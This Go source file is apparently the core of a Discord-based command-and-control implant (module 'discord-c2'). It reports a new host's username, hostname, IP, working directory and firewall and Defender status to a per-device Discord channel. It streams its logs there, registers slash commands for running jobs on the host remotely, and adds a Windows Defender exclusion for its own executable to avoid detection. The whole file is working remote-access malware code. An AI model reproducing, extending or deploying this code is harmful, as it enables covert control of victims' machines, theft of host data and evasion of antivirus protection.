// Package bot boots the Discord client, provisions the per-device channel,
// registers slash commands, and runs the message/interaction handlers.
package bot

import (
	"fmt"
	"log"
	"net"
	"os"
	"os/signal"
	"os/user"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"

	"discord-c2/internal/audit"
	"discord-c2/internal/commands"
	"discord-c2/internal/config"
	"discord-c2/internal/jobs"
	"discord-c2/internal/logstream"
	"discord-c2/internal/media"
	"discord-c2/internal/winsec"

	"github.com/bwmarrin/discordgo"
)

var (
	// channelID is the Discord text channel associated with this device. It is
	// guarded by channelMu because the reconnect watchdog may update it.
	channelMu sync.RWMutex
	channelID string
	// guildID is the Discord guild in which device channels and commands live.
	guildID string
	// allowedUsers, when non-empty, restricts control to these Discord user IDs.
	allowedUsers map[string]bool
	// jobManager owns asynchronous command execution for this process.
	jobManager *jobs.Manager
	// startupComplete becomes true once the initial banner and channel are set.
	startupComplete atomic.Bool
	// reconcileMu serializes reconnect reconciliation.
	reconcileMu sync.Mutex
)

func deviceChannel() string {
	channelMu.RLock()
	defer channelMu.RUnlock()
	return channelID
}

func setDeviceChannel(id string) {
	channelMu.Lock()
	channelID = id
	channelMu.Unlock()
	commands.SetChannel(id)
}

func userAllowed(id string) bool {
	return len(allowedUsers) == 0 || allowedUsers[id]
}

// Run starts the Discord session, ensures commands and the device channel
// exist, posts the connection banner, and blocks until shutdown.
func Run(cfg config.Config) error {
	guildID = cfg.GuildID
	allowedUsers = cfg.AllowedUsers
	commands.SetAllowedUsers(cfg.AllowedUsers)
	if len(allowedUsers) == 0 {
		log.Printf("warning: DISCORD_ALLOWED_USERS is empty; any guild member in the device channel can control this host")
	}

	auditLog, err := audit.Open(cfg.AuditLog)
	if err != nil {
		log.Printf("audit disabled: %v", err)
		auditLog = nil
	}
	defer auditLog.Close()
	jobManager = jobs.New(cfg.MaxJobs, cfg.JobTimeout, cfg.MaxOutput, auditLog)
	commands.SetJobs(jobManager)

	dg, err := discordgo.New("Bot " + cfg.BotToken)
	if err != nil {
		return fmt.Errorf("create Discord session: %w", err)
	}

	dg.AddHandler(handler)
	dg.AddHandler(commands.Handle)
	dg.AddHandler(onReady)
	dg.AddHandler(onResumed)
	dg.AddHandler(onDisconnect)
	// GuildMessages is required for channel traffic; MessageContent lets the
	// message shortcut handler read commands from the device channel.
	dg.Identify.Intents = discordgo.IntentsGuildMessages | discordgo.IntentsMessageContent

	if err := dg.Open(); err != nil {
		return fmt.Errorf("open Discord session: %w", err)
	}

	jobManager.SetNotifier(func(j jobs.Job) {
		for _, chunk := range jobs.ResultChunks(j, 1700) {
			if _, err := dg.ChannelMessageSend(j.ChannelID, chunk); err != nil {
				log.Printf("failed to deliver job %s result: %v", j.ID, err)
				return
			}
		}
	})

	log.SetOutput(&logstream.Writer{Base: os.Stdout})

	currentUser, _ := user.Current()
	hostname, _ := os.Hostname()

	ipStr := primaryIPv4()
	sessionID := fmt.Sprintf("%s | %s | %s", hostname, currentUser.Username, ipStr)
	cwd, _ := os.Getwd()

	firewallStatus, defenderStatus := windowsSecuritySummary()

	categoryName := categoryForOS(runtime.GOOS)
	log.Printf("detected OS=%s, assigning category=%s", runtime.GOOS, categoryName)

	categoryID, err := getOrCreateCategory(dg, categoryName)
	if err != nil {
		return fmt.Errorf("ensure category %s: %w", categoryName, err)
	}

	channelName := makeChannelName(hostname, currentUser.Username)
	log.Printf("ensuring device channel %s", channelName)
	chID, err := getOrCreateDeviceChannel(dg, categoryID, channelName)
	if err != nil {
		return fmt.Errorf("ensure device channel %s: %w", channelName, err)
	}

	setDeviceChannel(chID)
	logstream.Enable(dg, chID)
	log.Printf("log streaming enabled for channel %s on connect", chID)

	go func() {
		log.Printf("checking ffmpeg availability on %s", runtime.GOOS)
		media.EnsureFFmpegAvailable(dg, chID, nil)
	}()

	firstMsg := fmt.Sprintf(
		"🛰️ New device connected!\n\n"+
			"🧾 Session: *%s*\n"+
			"🌐 IP: `%s`\n"+
			"🙍 User: `%s`\n"+
			"🖥️ Hostname: `%s`\n"+
			"💽 OS: %s\n"+
			"🔧 Arch: `%s`\n"+
			"📂 CWD: `%s`\n"+
			"🛡 Firewall: `%s`\n"+
			"🧬 Defender: `%s`",
		sessionID,
		ipStr,
		currentUser.Username,
		hostname,
		osLabel(runtime.GOOS),
		runtime.GOARCH,
		cwd,
		firewallStatus,
		defenderStatus,
	)
	m, _ := dg.ChannelMessageSend(chID, firstMsg)
	if m != nil {
		dg.ChannelMessagePin(chID, m.ID)
	}

	// Register after the channel is usable and off the startup path: Discord
	// rate-limits command updates and a slow sync must not block control.
	go registerCommands(dg)

	startupComplete.Store(true)

	sc := make(chan os.Signal, 1)
	signal.Notify(sc, syscall.SIGINT, syscall.SIGTERM, os.Interrupt)
	<-sc

	return dg.Close()
}

// registerCommands replaces the guild's command set with the grouped layout in
// a single bulk overwrite. Discord scopes commands to the guild, not the
// channel, so the Windows group is only present when this client runs on
// Windows; use one guild (or one bot) per OS for mixed fleets.
func registerCommands(dg *discordgo.Session) {
	if _, err := dg.ApplicationCommandBulkOverwrite(
		dg.State.User.ID,
		guildID,
		commands.Definitions(runtime.GOOS),
	); err != nil {
		log.Printf("failed to sync application commands: %v", err)
		return
	}
	log.Printf("synced %d command groups for %s", len(commands.Definitions(runtime.GOOS)), runtime.GOOS)
}

func primaryIPv4() string {
	ifaces, err := net.Interfaces()
	if err != nil {
		return "unknown"
	}
	for _, iface := range ifaces {
		if iface.Flags&net.FlagUp == 0 || iface.Flags&net.FlagLoopback != 0 {
			continue
		}
		addrs, err := iface.Addrs()
		if err != nil {
			continue
		}
		for _, addr := range addrs {
			var ip net.IP
			switch v := addr.(type) {
			case *net.IPNet:
				ip = v.IP
			case *net.IPAddr:
				ip = v.IP
			}
			if ip == nil || ip.IsLoopback() {
				continue
			}
			if ip = ip.To4(); ip != nil {
				return ip.String()
			}
		}
	}
	return "unknown"
}

func windowsSecuritySummary() (firewall, defender string) {
	if runtime.GOOS != "windows" {
		return "n/a", "n/a"
	}

	firewall, defender = "unknown", "unknown"
	if err := winsec.EnsureCurrentExeExcluded(); err != nil {
		log.Printf("failed to ensure Defender exclusion for current executable: %v", err)
	}
	if fw, err := winsec.FirewallStatus(); err == nil {
		firewall = fw
	} else {
		firewall = "unknown (error: " + winsec.Truncate(err.Error(), 120) + ")"
	}
	if def, err := winsec.DefenderStatus(); err == nil {
		defender = def
	} else {
		defender = "unknown (error: " + winsec.Truncate(err.Error(), 120) + ")"
	}
	return firewall, defender
}

func categoryForOS(goos string) string {
	switch goos {
	case "windows":
		return "windows"
	case "linux":
		return "linux"
	case "darwin":
		return "mac"
	default:
		return "other"
	}
}

func osLabel(goos string) string {
	switch goos {
	case "windows":
		return "🪟 Windows"
	case "linux":
		return "🐧 Linux"
	case "darwin":
		return "🍎 macOS"
	default:
		return "💻 " + goos
	}
}

// makeChannelName derives a Discord channel name from hostname and username,
// normalizing invalid characters and limiting the length.
func makeChannelName(hostname, username string) string {
	base := strings.ToLower(hostname + "-" + username)
	var b strings.Builder
	prevDash := false
	for _, r := range base {
		if (r >= 'a' && r <= 'z') || (r >= '0' && r <= '9') {
			b.WriteRune(r)
			prevDash = false
			continue
		}
		if !prevDash {
			b.WriteRune('-')
			prevDash = true
		}
	}
	name := strings.Trim(b.String(), "-")
	if name == "" {
		return "device"
	}
	if len(name) > 90 {
		name = name[:90]
	}
	return name
}
